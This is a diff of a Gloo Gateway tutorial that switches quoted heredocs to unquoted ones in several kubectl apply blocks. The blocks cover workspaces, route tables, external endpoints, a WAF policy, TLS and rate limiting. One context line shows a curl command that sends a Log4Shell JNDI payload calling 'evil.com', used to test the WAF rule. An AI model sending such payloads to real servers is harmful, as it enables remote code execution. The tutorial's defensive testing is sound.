@@ -188,7 +188,7 @@ Imagine that you have the following teams. Each team represents a "tenant" in Gl
 Also note that a dedicated namespace is created for each workspace to place their configuration (`ops-team`, `dev-team` namespaces). It is recommended that the configuration is separate from your deployments.
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: admin.gloo.solo.io/v2
 kind: Workspace
 metadata:
@@ -242,7 +242,7 @@ This allows you to create a hierarchy of routing configuration and dynamically a
 1. Let's start by assuming the role of a Ops team. Configure the Gateway to listen on port 80 and create a generic RouteTable that further delegates the traffic routing to RouteTables in the `dev-team` workspace.
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualGateway
 metadata:
@@ -288,7 +288,7 @@ EOF
 2. The Dev team can now write their own RouteTables in their own namespace. Create a RouteTable to send traffic that matches URI `prefix: /` to the frontend application.
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
@@ -330,7 +330,7 @@ You've successfully exposed the frontend application thru the Gloo Gateway.
 Next, lets see how easy it is to expose another application. This time, we will match on URI `prefix: /hipstershop.CurrencyService/Convert` and send to the currencyservice application.
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
 metadata:
@@ -394,7 +394,7 @@ Once an ExternalEndpoint is created, a RouteTable can be used to send traffic to
 1. Create a reference to the httpbin.org. The `ExternalEndpoint` is a definition of where you can reach the external application. The `ExternalService` is a Gloo internal reference that the `RouteTable` can utilize. In certain use cases, you can assign many `ExternalEndpoints` to a single `ExternalService`
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: ExternalEndpoint
 metadata:
@@ -490,7 +490,7 @@ curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
 * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: security.policy.gloo.solo.io/v2
 kind: WAFPolicy
 metadata:
@@ -734,7 +734,7 @@ rm tls.crt tls.key
 2. Adding HTTPS to our gateway is simple as updating the virtual gateway to use our ssl certificate.
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: networking.gloo.solo.io/v2
 kind: VirtualGateway
 metadata:
@@ -813,7 +813,7 @@ The `RateLimitPolicy` pulls together the `RateLimitClientConfig`, `RateLimitServ
 1. Apply the `RateLimitPolicy`
 
 ```yaml
-kubectl apply -f - <<'EOF'
+kubectl apply -f - <<EOF
 apiVersion: trafficcontrol.policy.gloo.solo.io/v2
 kind: RateLimitClientConfig
 metadata:
